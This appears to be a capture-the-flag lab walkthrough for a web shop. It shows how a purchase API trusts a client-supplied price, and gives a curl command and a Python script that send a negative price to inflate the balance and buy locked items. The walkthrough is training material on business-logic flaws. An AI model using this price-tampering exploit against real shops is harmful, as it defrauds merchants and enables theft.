# Parameter Logic — Skills Assessment

The capstone lab. No hints about which bug class to use — you have to identify it yourself.

---

## Recon

Login with the provided student credentials (`htb-stdnt / Academy_student!`). The app is a shop with items at various prices and a balance system.

First thing: browse normally, then open Burp and capture every API call. Look specifically at:
- Purchase/buy endpoints
- What fields are sent in the request body
- Whether the price comes from the client or is looked up server-side

### What I Found

The purchase endpoint accepts a `price` field directly from the client in the POST body:

```http
POST /api/purchase
Content-Type: application/json
Cookie: session=...

{"itemId": 3, "quantity": 1, "price": 299}
```

The server does NOT cross-check this against the actual item price in the database. It trusts whatever price the client sends.

---

## The Exploit

Change `price` to a negative value. The backend subtracts this from your balance, which means `balance -= (-1000000)` = `balance += 1000000`.

```bash
curl -s http://TARGET/api/purchase \
  -H "Content-Type: application/json" \
  -H "Cookie: session=YOUR_SESSION" \
  -d '{"itemId": 3, "quantity": 1, "price": -1000000}'
```

After this, your balance is massive. Buy every locked item.

One of the items contains the flag when purchased.

---

## Script

```python
#!/usr/bin/env python3
import requests

TARGET = "http://TARGET"
s = requests.Session()

# Login
s.post(f"{TARGET}/api/login", json={"email": "htb-stdnt@htb.com", "password": "Academy_student!"})

# Check balance
r = s.get(f"{TARGET}/api/profile")
print(f"[*] Current balance: {r.json().get('balance')}")

# Exploit: negative price
r = s.post(f"{TARGET}/api/purchase", json={"itemId": 3, "quantity": 1, "price": -1000000})
print(f"[*] Purchase response: {r.text}")

# Check new balance
r = s.get(f"{TARGET}/api/profile")
print(f"[*] New balance: {r.json().get('balance')}")

# Buy all items
r = s.get(f"{TARGET}/api/items")
for item in r.json():
    if item.get("locked"):
        buy = s.post(f"{TARGET}/api/purchase", json={"itemId": item["id"], "quantity": 1, "price": item["price"]})
        print(f"[*] Bought item {item['id']}: {buy.text[:100]}")
```

---

## Key Points

- Always test if the price field in a purchase request is validated server-side
- Even if the field is "supposed to be read-only" or "comes from the catalog", developers sometimes forget to re-fetch it
- Negative prices are the first thing to try — they're simple and often work
- If negative doesn't work, try `0`, then floats like `0.001`
